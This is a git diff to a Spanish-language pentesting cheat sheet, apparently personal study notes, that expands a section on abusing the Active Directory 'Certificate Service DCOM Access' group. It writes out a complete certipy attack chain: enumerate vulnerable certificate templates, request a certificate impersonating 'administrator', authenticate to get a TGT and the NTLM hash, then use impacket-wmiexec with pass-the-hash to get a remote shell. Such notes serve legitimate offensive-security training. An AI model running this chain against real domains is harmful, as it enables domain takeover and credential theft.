@@ -241,27 +241,29 @@ Notas:
 ```
 
 ```powershell 
-6. 'Certificate Service DCOM Access' = 
+6. 'Certificate Service DCOM Access' = Acceso remoto vía DCOM al servicio de Certificate Authority (CA).  
+Esto significa que los usuarios de ese grupo pueden interactuar con la CA de forma remota (por ejemplo, para solicitar certificados). Además, debe de existir una plantilla vulnerable en la 'CA' como: 'Enrollee supplies subject, client authentication (OID)' y no tener restricciones de grupo
 
 
 Pasos:
-❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP     # Enumerar el 'AD CS' para ver si hay vulnerabilidades y las IP son del DC
-	❯ cat file_certipy.txt | grep Vuln -C 50       # Mirar las 50 lineas donde existe la vulenrabilidad 
+# Enumerar con Kali el 'AD CS' para ver si hay vulnerabilidades
+❯ certipy find -ns IP -u 'user' -p 'password' -dc-ip IP -target IP   
+	# IP = Es la dirección IP del DC
+	❯ cat file_certipy.txt | grep Vuln -C 50      # Mirar las 50 lineas donde existe la vulnerabilidad con el CA y el template 
 
-❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca CA -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar el certificado del usuario 'Administrator'
-	# ca = Es el certificado de autoridades, se encuentra en el archivo enumerado anteriormente 
+❯ certipy req -username user@domain.corp -password passwd -target-ip IP -ca 'CA' -template 'template_name' -upn 'administrator@domain.corp'        # Solicitar con Kali el certificado del usuario 'Administrator'
+	# ca = Es el 'Certificate Authorities' y se encuentra en el archivo enumerado anteriormente 
 	# template = Es la plantilla vulnerable y se encuentra en el archivo enumerado anteriormente
 	# upn = El usuario al que queremos suplantar 
 	# user = Es el usuario que se encuentra en el grupo 'Certificate Service DCOM Access' 
 	
-❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar el TGT  del usuario 'administrator' con el certificado 'PFX' y se obtiene el hash NTLM  
+❯ certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.corp' -dc-ip IP  # Solicitar con Kali el TGT  del usuario 'administrator' con el certificado 'PFX' y obtener el hash NTLM  
 
-❯ 
+❯ impacket-wmiexec domain.corp/administrator@IP -no-pass -hashes 'LM:NT'    # Ingresar a Windows desde Kali con el usuario administrator 
 
 
 Notas:
 	1. Sincronizar Kali con el DC 
 		❯ ntpdate IP_DC
 	2. Al solicitar el certificado se debe de mostrar lo siguiente: 'Saved certificate and private key to administrator.pfx'
-	3. 
 ```
